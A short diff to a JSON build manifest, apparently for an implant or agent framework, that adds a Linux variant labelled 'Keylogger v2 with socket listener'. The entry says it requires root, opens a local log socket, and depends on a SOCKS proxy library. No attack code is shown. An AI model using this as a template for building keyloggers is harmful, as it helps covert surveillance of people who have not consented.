@@ -21,6 +21,17 @@
             "github.com/armon/go-socks5"
         ]
     },
+    "linux/socket-listener": {
+        "type": "Keylogger v2 with socket listener",
+        "description": "requires root, has a socket at /var/run/log.sock for custom logs",
+        "code_path": "linux/socket-listener/client.go",
+        "flags": "-trimpath -ldflags",
+        "environment": "CGO_ENABLED=0",
+        "file_suffix": "",
+        "dependencies":[
+            "github.com/armon/go-socks5"
+        ]
+    },
     "linux/unprivileged": {
         "type": "Linux Original",
         "description": "linux unprivileged",
